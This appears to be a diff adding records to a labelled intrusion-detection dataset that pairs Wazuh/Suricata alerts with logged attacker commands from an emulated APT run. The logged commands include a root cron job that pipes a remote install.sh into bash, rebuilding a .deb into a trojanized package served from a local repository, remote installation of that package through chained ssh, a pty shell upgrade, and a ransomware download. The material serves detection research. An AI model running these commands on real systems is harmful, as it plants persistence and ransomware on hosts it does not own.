+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "8",
+            "pkts_toclient": "5",
+            "bytes_toserver": "1500",
+            "bytes_toclient": "1775",
+            "start": "2025-12-12T10:32:44.992550+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1020",
+      "seq": "3_ssh_apt-10",
+      "timestamp": "2025-12-12T10:32:47.700+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-10/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:32:47.700+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 38,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765535567.1011626",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:32:45.439809+0000",
+          "flow_id": "1414186421549407.000000",
+          "in_iface": "ens5",
+          "event_type": "alert",
+          "src_ip": "172.17.100.122",
+          "src_port": "39624",
+          "dest_ip": "91.189.91.82",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:eIrszB0zMgSsVAXdr1PENDkD8eE=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "security.ubuntu.com",
+            "url": "/ubuntu/dists/jammy-security/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.4.12) non-interactive",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "4",
+            "pkts_toclient": "3",
+            "bytes_toserver": "504",
+            "bytes_toclient": "500",
+            "start": "2025-12-12T10:32:45.227679+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1021",
+      "seq": "3_ssh_apt-11",
+      "timestamp": "2025-12-12T10:33:20.630661",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-11/attacker/logs/attackmate.json",
+      "command": "mkdir /tmp/.tmux_data\n",
+      "tactics": "Defense Evasion",
+      "techniques": "T1036.005,T1564.001 ",
+      "technique_name": "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:33:20.630661",
+        "type": "ssh",
+        "cmd": "mkdir /tmp/.tmux_data\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1036.005,T1564.001 ",
+            "tactics": "Defense Evasion",
+            "technique_name": "Masquerading: Match Legitimate Name or Location,Hide Artifacts: Hidden Files and Directories"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1022",
+      "seq": "3_ssh_apt-12_13_14",
+      "timestamp": "2025-12-12T10:33:50.640719",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
+      "command": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n",
+      "tactics": "Persistence,Defense Evasion",
+      "techniques": "T1574",
+      "technique_name": "Hijack Execution Flow",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:33:50.640719",
+        "type": "ssh",
+        "cmd": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1574",
+            "tactics": "Persistence,Defense Evasion",
+            "technique_name": "Hijack Execution Flow"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1023",
+      "seq": "3_ssh_apt-12_13_14",
+      "timestamp": "2025-12-12T10:34:35.650525",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
+      "command": ":%s/1.0-1/1.0-2/g\n",
+      "tactics": "Execution",
+      "techniques": "T1059,T1574",
+      "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:34:35.650525",
+        "type": "ssh",
+        "cmd": ":%s/1.0-1/1.0-2/g\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059,T1574",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1024",
+      "seq": "3_ssh_apt-12_13_14",
+      "timestamp": "2025-12-12T10:35:05.654988",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-12_13_14/attacker/logs/attackmate.json",
+      "command": ":wq\n",
+      "tactics": "Execution",
+      "techniques": "T1059,T1574",
+      "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:35:05.654988",
+        "type": "ssh",
+        "cmd": ":wq\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059,T1574",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter,Hijack Execution Flow"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1025",
+      "seq": "3_ssh_apt-15_16",
+      "timestamp": "2025-12-12T10:36:50.731411",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-15_16/attacker/logs/attackmate.json",
+      "command": "echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health",
+      "tactics": "Persistence,Command and Control",
+      "techniques": "T1053.003,T1105,T1071.001 ",
+      "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols ",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:36:50.731411",
+        "type": "ssh",
+        "cmd": "echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1053.003,T1105,T1071.001 ",
+            "tactics": "Persistence,Command and Control",
+            "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1026",
+      "seq": "3_ssh_apt-15_16",
+      "timestamp": "2025-12-12T10:37:50.743981",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-15_16/attacker/logs/attackmate.json",
+      "command": ":wq\n",
+      "tactics": "Persistence,Command and Control",
+      "techniques": "T1053.003,T1105,T1071.001 ",
+      "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols ",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:37:50.743981",
+        "type": "ssh",
+        "cmd": ":wq\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1053.003,T1105,T1071.001 ",
+            "tactics": "Persistence,Command and Control",
+            "technique_name": "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1027",
+      "seq": "3_ssh_apt-17_18",
+      "timestamp": "2025-12-12T10:38:20.844715",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
+      "command": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n",
+      "tactics": "Execution,Lateral Movement",
+      "techniques": "T1072",
+      "technique_name": "Software Deployment Tools",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:38:20.844715",
+        "type": "ssh",
+        "cmd": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1072",
+            "tactics": "Execution,Lateral Movement",
+            "technique_name": "Software Deployment Tools"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1028",
+      "seq": "3_ssh_apt-17_18",
+      "timestamp": "2025-12-12T10:38:51.057214",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
+      "command": "dpkg-scanpackages . | gzip -c9  > Packages.gz\n",
+      "tactics": "Execution,Lateral Movement",
+      "techniques": "T1072",
+      "technique_name": "Software Deployment Tools",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:38:51.057214",
+        "type": "ssh",
+        "cmd": "dpkg-scanpackages . | gzip -c9  > Packages.gz\n",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1072",
+            "tactics": "Execution,Lateral Movement",
+            "technique_name": "Software Deployment Tools"
+          },
+          "hostname": null,
+          "port": null,
+          "username": null,
+          "password": null,
+          "passphrase": null,
+          "key_filename": null,
+          "creates_session": null,
+          "session": "foothold",
+          "clear_cache": false,
+          "timeout": 60,
+          "jmp_hostname": null,
+          "jmp_port": null,
+          "jmp_username": null,
+          "interactive": true,
+          "command_timeout": "15",
+          "prompts": [
+            "$ ",
+            "# ",
+            "> "
+          ],
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1029",
+      "seq": "3_ssh_apt-17_18",
+      "timestamp": "2025-12-12T10:39:06.247325",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/attacker/logs/attackmate.json",
+      "command": "ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o \"ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@192.42.0.201\" aecid@10.12.0.223 'echo \"ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\\''apt update && apt install -y healthcheckd'\\''\" | at now + 2 minute'",
+      "tactics": null,
+      "techniques": null,
+      "technique_name": null,
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:39:06.247325",
+        "type": "shell",
+        "cmd": "ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o \"ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@192.42.0.201\" aecid@10.12.0.223 'echo \"ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\\''apt update && apt install -y healthcheckd'\\''\" | at now + 2 minute'",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "delayed_manifestation": "120s"
+          },
+          "interactive": false,
+          "creates_session": null,
+          "session": null,
+          "command_timeout": "10",
+          "read": true,
+          "command_shell": "/bin/sh",
+          "bin": false
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1031",
+      "seq": "3_ssh_apt-17_18",
+      "timestamp": "2025-12-12T10:41:02.320+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-17_18/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:41:02.320+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+          "id": "86601",
+          "firedtimes": 56,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765536062.1045385",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:41:00.666090+0000",
+          "flow_id": "6403548551724.000000",
+          "in_iface": "ens4",
+          "event_type": "alert",
+          "src_ip": "192.168.100.23",
+          "src_port": "40568",
+          "dest_ip": "18.239.255.36",
+          "dest_port": "80",
+          "proto": "TCP",
+          "community_id": "1:whVLW9G/6HH+EiREb84/lkjBjW4=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2013504",
+            "rev": "6",
+            "signature": "ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management",
+            "category": "Not Suspicious Traffic",
+            "severity": "3",
+            "metadata": {
+              "confidence": [
+                "High"
+              ],
+              "created_at": [
+                "2011_08_31"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "updated_at": [
+                "2020_04_22"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "apt.puppet.com",
+            "url": "/dists/bullseye/InRelease",
+            "http_user_agent": "Debian APT-HTTP/1.3 (2.6.1)",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "304",
+            "length": "0"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "4",
+            "pkts_toclient": "3",
+            "bytes_toserver": "469",
+            "bytes_toclient": "1503",
+            "start": "2025-12-12T10:41:00.367148+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1032",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:45:39.950733",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "shell",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:45:39.950733",
+        "type": "msf-session",
+        "cmd": "shell",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1033",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:45:56.275887",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:45:56.275887",
+        "type": "msf-session",
+        "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1034",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:46:12.648064",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "export SHELL=bash",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:46:12.648064",
+        "type": "msf-session",
+        "cmd": "export SHELL=bash",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1035",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:46:29.018547",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "export TERM=xterm256-color",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:46:29.018547",
+        "type": "msf-session",
+        "cmd": "export TERM=xterm256-color",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1036",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:46:45.398399",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "stty rows 38 columns 116",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:46:45.398399",
+        "type": "msf-session",
+        "cmd": "stty rows 38 columns 116",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1037",
+      "seq": "3_ssh_apt-19_20_21_22_23_24",
+      "timestamp": "2025-12-12T10:47:01.722170",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-19_20_21_22_23_24/attacker/logs/attackmate.json",
+      "command": "export PS1=\"PWN >\"",
+      "tactics": "Execution",
+      "techniques": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:47:01.722170",
+        "type": "msf-session",
+        "cmd": "export PS1=\"PWN >\"",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1059",
+            "tactics": "Execution",
+            "technique_name": "Command and Scripting Interpreter"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1038",
+      "seq": "3_ssh_apt-25",
+      "timestamp": "2025-12-12T10:47:18.091378",
+      "source_type": "attackmate",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-25/attacker/logs/attackmate.json",
+      "command": "curl http://192.42.1.174/donotcry > /opt/donotcry",
+      "tactics": "Impact,Command and Control",
+      "techniques": "T1486,T1105",
+      "technique_name": "Data Encrypted for Impact, Ingress Tool Transfer",
+      "raw_json": {
+        "start-datetime": "2025-12-12T10:47:18.091378",
+        "type": "msf-session",
+        "cmd": "curl http://192.42.1.174/donotcry > /opt/donotcry",
+        "parameters": {
+          "only_if": null,
+          "error_if": null,
+          "error_if_not": null,
+          "loop_if": null,
+          "loop_if_not": null,
+          "loop_count": "3",
+          "exit_on_error": true,
+          "save": null,
+          "background": false,
+          "kill_on_exit": true,
+          "metadata": {
+            "techniques": "T1486,T1105",
+            "tactics": "Impact,Command and Control",
+            "technique_name": "Data Encrypted for Impact, Ingress Tool Transfer"
+          },
+          "stdapi": false,
+          "write": false,
+          "read": false,
+          "session": "movement",
+          "end_str": null
+        }
+      }
+    },
+    {
+      "raw_id": "EVT-1039",
+      "seq": "3_ssh_apt-25",
+      "timestamp": "2025-12-12T10:47:18.399+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-25/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET HUNTING curl User-Agent to Dotted Quad",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:47:18.399+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET HUNTING curl User-Agent to Dotted Quad",
+          "id": "86601",
+          "firedtimes": 69,
+          "mail": false,
+          "groups": [
+            "ids",
+            "suricata"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "inetfw",
+          "ip": "192.168.100.254"
+        },
+        "manager": {
+          "name": "wazuh"
+        },
+        "id": "1765536438.1070733",
+        "decoder": {
+          "name": "json"
+        },
+        "data": {
+          "timestamp": "2025-12-12T10:47:17.536457+0000",
+          "flow_id": "1010880459641998.000000",
+          "in_iface": "ens4",
+          "event_type": "alert",
+          "src_ip": "192.168.100.23",
+          "src_port": "48342",
+          "dest_ip": "192.42.1.174",
+          "dest_port": "80",
+          "proto": "TCP",
+          "metadata": {
+            "flowbits": [
+              "http.dottedquadhost"
+            ]
+          },
+          "community_id": "1:OuR6BFoXGdDG4c1m5KuKmJC5z+E=",
+          "tx_id": "0",
+          "alert": {
+            "action": "allowed",
+            "gid": "1",
+            "signature_id": "2034567",
+            "rev": "1",
+            "signature": "ET HUNTING curl User-Agent to Dotted Quad",
+            "category": "Potentially Bad Traffic",
+            "severity": "2",
+            "metadata": {
+              "attack_target": [
+                "Client_Endpoint"
+              ],
+              "confidence": [
+                "Medium"
+              ],
+              "created_at": [
+                "2021_12_01"
+              ],
+              "deployment": [
+                "Perimeter"
+              ],
+              "signature_severity": [
+                "Informational"
+              ],
+              "tag": [
+                "Description_Generated_By_Proofpoint_Nexus"
+              ],
+              "updated_at": [
+                "2021_12_01"
+              ]
+            }
+          },
+          "http": {
+            "hostname": "192.42.1.174",
+            "url": "/donotcry",
+            "http_user_agent": "curl/7.88.1",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": "200",
+            "length": "6739"
+          },
+          "app_proto": "http",
+          "flow": {
+            "pkts_toserver": "4",
+            "pkts_toclient": "12",
+            "bytes_toserver": "356",
+            "bytes_toclient": "14700",
+            "start": "2025-12-12T10:47:17.529550+0000"
+          }
+        },
+        "location": "/var/log/suricata/eve.json"
+      }
+    },
+    {
+      "raw_id": "EVT-1040",
+      "seq": "3_ssh_apt-25",
+      "timestamp": "2025-12-12T10:47:18.401+0000",
+      "source_type": "wazuh",
+      "source_file": "CAM-LDS: sequences/3_ssh_apt-25/wazuh/logs/alerts/alerts.json",
+      "rule_id": "86601",
+      "rule_description": "Suricata: Alert - ET POLICY Executable and linking format (ELF) file download Over HTTP",
+      "level": 3,
+      "src_ip": "192.42.1.174",
+      "dst_ip": "10.12.0.223",
+      "raw_json": {
+        "timestamp": "2025-12-12T10:47:18.401+0000",
+        "rule": {
+          "level": 3,
+          "description": "Suricata: Alert - ET POLICY Executable and linking format (ELF) file download Over HTTP",
+          "id": "86601",
+          "firedtimes": 70,
+          "mail": false,
+          "groups": [
+            "ids",
